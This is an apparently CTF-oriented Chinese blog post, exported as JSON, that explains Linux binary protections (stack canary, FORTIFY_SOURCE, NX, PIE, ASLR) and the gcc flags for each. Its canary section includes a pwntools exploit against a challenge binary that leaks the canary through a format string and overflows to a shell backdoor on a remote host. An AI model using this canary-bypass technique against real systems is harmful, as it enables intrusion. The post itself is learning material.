{"title":"Linux常见的保护机制","uid":"49b5f2dc0a9e31a5cb54c844157811ae","slug":"linux程序的常⽤保护机制","date":"2021-04-09T13:14:59.000Z","updated":"2021-10-22T12:43:41.925Z","comments":true,"path":"api/articles/linux程序的常⽤保护机制.json","keywords":null,"cover":"https://i.loli.net/2021/05/06/H1hc6iNuVekgGtz.jpg","content":"<h1 id=\"checksec（gdb安装好就有）\"><a href=\"#checksec（gdb安装好就有）\" class=\"headerlink\" title=\"checksec（gdb安装好就有）\"></a>checksec（gdb安装好就有）</h1><h2 id=\"gdb\"><a href=\"#gdb\" class=\"headerlink\" title=\"gdb\"></a>gdb</h2><p>动态调试软件，必备。</p>\n<p>安装：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install gdb</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"用法\"><a href=\"#用法\" class=\"headerlink\" title=\"用法\"></a>用法</h2><p>作用：它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>\n<p>用法：checksec filename</p>\n<p>例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ checksec start</span><br><span class=\"line\">CANARY    : disabled(这个选项表示栈保护功能有没有开启。)</span><br><span class=\"line\">FORTIFY   : disabled</span><br><span class=\"line\">NX        : ENABLED</span><br><span class=\"line\">PIE       : disabled</span><br><span class=\"line\">RELRO     : disabled</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"CANNARY-栈保护\"><a href=\"#CANNARY-栈保护\" class=\"headerlink\" title=\"CANNARY(栈保护)\"></a>CANNARY(栈保护)</h1><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈中高危区插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。**</p>\n<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>\n<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F;禁用栈保护</span><br><span class=\"line\">gcc -fstack-protector -o test test.c   &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class=\"line\">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"stackguard1\"><a href=\"#stackguard1\" class=\"headerlink\" title=\"stackguard1\"></a><strong><a href=\"https://github.com/Eli0t-g/pwn_appendix/raw/main/canary/stackguard1\">stackguard1</a></strong></h2><p>一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放入rax中，rax会放入rbp-8的位置，最后清零eax<img src=\"https://i.loli.net/2021/10/22/iMEf48ZNa927yjJ.png\" alt=\"屏幕截图 2021-10-22 195020.png\"></p>\n<p>程序运行到快结束时，会检查canary，首先将canary取出到rcx，rcx会和fs寄存器对应的偏移处取出进行比较，不同就会跳转到__stack_chk_fail@plt位置<img src=\"https://i.loli.net/2021/10/22/9yZLESIY7cpKO8r.png\" alt=\"屏幕截图 2021-10-22 195405.png\"></p>\n<p>__stack_chk_fail函数会强行结束进程并弹出警告</p>\n<p>分析栈结构：缓冲区过后就是canary，所以如果是简单的溢出覆盖返回地址就会覆盖到canary，从而导致程序崩溃。因此，如果要利用栈溢出就一定要绕过canary。所以思路就是先通过输出函数泄露canary的值，之后在覆盖时用泄露的canary值覆盖canary，其它的就覆盖成我们想要的，这样就绕过了canary。</p>\n<p><img src=\"https://i.loli.net/2021/10/22/Rq56B1deJrujDh4.png\" alt=\"image.png\"></p>\n<p>通过字符串列表找到bin/sh，找到调用的位置，发现函数canary_protect_me函数里面会调用这个字符串，仔细分析一下，可以断定圈里面的汇编代码组装成函数execve(“bin/sh”,0,0) 等价于system(“bin/sh”)，所以我们可以利用栈溢出跳转到这里就可以获得shell</p>\n<p><img src=\"https://i.loli.net/2021/10/22/aFk6zUoXZ4H983J.png\" alt=\"屏幕截图 2021-10-22 201418.png\"></p>\n<p>因为是gets函数最后会补上\\x00，会终止printf读取，所以无法通过覆盖泄露，但因为是printf输出，所以可以采取格式化字符串漏洞泄露canary<img src=\"https://i.loli.net/2021/10/22/Sc4iJadPK5pWV32.png\" alt=\"屏幕截图 2021-10-22 203619.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">back_door = (<span class=\"number\">0x4011d6</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x0401343</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x402004</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stackguard1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;123.57.230.48&#x27;</span>,<span class=\"number\">12344</span>)</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;%11$p&#x27;</span>  <span class=\"comment\"># 泄露出第十一个参数的值</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)  <span class=\"comment\"># 将接收的转为十六进制数</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(canary)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(back_door))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"FORTIFY-轻微的检查\"><a href=\"#FORTIFY-轻微的检查\" class=\"headerlink\" title=\"FORTIFY(轻微的检查)\"></a>FORTIFY(轻微的检查)</h1><p>fority其实是非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memepy,stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf， vsprintf，vsnprintf, gets以及宽字符的变体。FORTIFY_ SOURCE设为1,并且将编译器设置为优化1(gcc -01)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不会开这个检查 </span><br><span class=\"line\">gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c &#x2F;&#x2F; 较弱的检查 </span><br><span class=\"line\">gcc -D_FORTIFY_SOURCE&#x3D;1 仅仅只会在编译时进⾏检查 (特别像某些头⽂件 #include &lt;str _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编 </span><br><span class=\"line\">gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c &#x2F;&#x2F; 较强的检查 gcc -D_FORTIFY_SOURCE&#x3D;2 程序执⾏时也会有检查 (如果检查到缓冲区溢出，就终⽌程序) _FORTIFY_SOURCE设为2，有些检查功能会加⼊，但是这可能导致程序崩溃。</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"NX（DEP）\"><a href=\"#NX（DEP）\" class=\"headerlink\" title=\"NX（DEP）\"></a>NX（DEP）</h1><p>NX（ DEP）的基本原理是将数据所在内存⻚标识为不可执⾏,当程序溢出成功转⼊shellcode时，程序会尝试在数据⻚⾯上执⾏指令，此时CPU就会抛出异常 ,⽽不是去执⾏恶意指令 。 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class=\"line\">gcc -z execstack -o test test.c &#x2F;&#x2F; 禁⽤NX保护 </span><br><span class=\"line\">gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure>\n\n<p>在Windows下，类似的概念为DEP（数据执行保护）,数据执⾏保护( D E P ) （ Data Execution Prevention ） 是⼀套软硬件技术，能 够 在 内 存上执⾏额外检查以帮助防⽌在系统上运⾏恶意代码 ,在最新版的Visual Studio中默认开启了DEP编译选项。</p>\n<h1 id=\"PIE（ASLR）\"><a href=\"#PIE（ASLR）\" class=\"headerlink\" title=\"PIE（ASLR）\"></a>PIE（ASLR）</h1><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。PIE和ASLR不是一样的作用，ASLR只能对堆、栈,ibc和mmap随机化，而不能对代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。区别是ASLR是系统功能选项，PIE和PIC是编译器功能选项。联系点在于在开启ASLR之后，PIE才会生效。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启PIE </span><br><span class=\"line\">gcc -fpie -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时强度为1 </span><br><span class=\"line\">gcc -fPIE -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时为最⾼强度2 </span><br><span class=\"line\">gcc -fpic -o test test.c &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIE</span><br><span class=\"line\">gcc -fPIC -o test test.c &#x2F;&#x2F; 开启PIC，此时为最⾼强度2，不会开启PIE</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ASLR-Address-Space-Layout-Randomization\"><a href=\"#ASLR-Address-Space-Layout-Randomization\" class=\"headerlink\" title=\"ASLR (Address Space Layout Randomization)\"></a>ASLR (Address Space Layout Randomization)</h1><p>ASLR是⼀种针对缓冲区溢出的安全保护技术,通过对堆栈 、共享库映射等线性区布局的随机化，通过增加攻击者预测⽬的地址的难度,防⽌攻击者直接定位攻击代码位置,达到阻⽌溢出攻击的⽬的。 </p>\n<p>参考文章：<a href=\"https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/\">https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>\n","text":"checksec（gdb安装好就有）gdb动态调试软件，必备。 安装： 1apt-get install gdb 用法作用：它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。 用法：checks...","link":"","photos":[],"count_time":{"symbolsCount":"3.8k","symbolsTime":"3 mins."},"categories":[{"name":"PWN","slug":"PWN","count":1,"path":"api/categories/PWN.json"}],"tags":[{"name":"基础知识","slug":"基础知识","count":1,"path":"api/tags/基础知识.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#checksec%EF%BC%88gdb%E5%AE%89%E8%A3%85%E5%A5%BD%E5%B0%B1%E6%9C%89%EF%BC%89\"><span class=\"toc-text\">checksec（gdb安装好就有）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#gdb\"><span class=\"toc-text\">gdb</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">用法</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CANNARY-%E6%A0%88%E4%BF%9D%E6%8A%A4\"><span class=\"toc-text\">CANNARY(栈保护)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stackguard1\"><span class=\"toc-text\">stackguard1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#FORTIFY-%E8%BD%BB%E5%BE%AE%E7%9A%84%E6%A3%80%E6%9F%A5\"><span class=\"toc-text\">FORTIFY(轻微的检查)</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NX%EF%BC%88DEP%EF%BC%89\"><span class=\"toc-text\">NX（DEP）</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#PIE%EF%BC%88ASLR%EF%BC%89\"><span class=\"toc-text\">PIE（ASLR）</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ASLR-Address-Space-Layout-Randomization\"><span class=\"toc-text\">ASLR (Address Space Layout Randomization)</span></a></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"C语言函数调用与常见调用约定","uid":"20bf7105b3d9595b11047eca410abfeb","slug":"C语言函数调用与常见调用约定","date":"2021-04-25T14:02:30.000Z","updated":"2021-05-09T03:22:20.395Z","comments":true,"path":"api/articles/C语言函数调用与常见调用约定.json","keywords":null,"cover":"https://i.loli.net/2021/05/06/Z3CboONMf2WxlR6.jpg","text":"函数调用下面代码展示了一个简单的加法子函数调用 12345678910#include&lt;stdio.h&gt;int plus (int a,int b)&#123; return a+b;&#125;void main()&#123; int a=1,b=2,c; c=p...","link":"","photos":[],"count_time":{"symbolsCount":864,"symbolsTime":"1 mins."},"categories":[{"name":"C语言","slug":"C语言","count":1,"path":"api/categories/C语言.json"}],"tags":[{"name":"收获","slug":"收获","count":1,"path":"api/tags/收获.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"bugkuMISC","uid":"aeac33b711f776d73f0726b5ddfdbdd8","slug":"bugku misc","date":"2021-02-02T13:24:11.000Z","updated":"2021-10-22T13:22:43.280Z","comments":true,"path":"api/articles/bugku misc.json","keywords":null,"cover":"https://i.loli.net/2021/05/06/nlZVfDTitYMJb6R.jpg","text":"BUGKU misc部分1 这是一张单纯的图片先看了一下属性，发现并没有什么有用的信息，打开就是上面那张图，没有上面异样， 直接丢winhex，拖至最底，发现是unicode加密 发现是unicode加密，直接解码成ASCII，得到flag 2 隐写看到题目就知道是图片隐写，对图...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}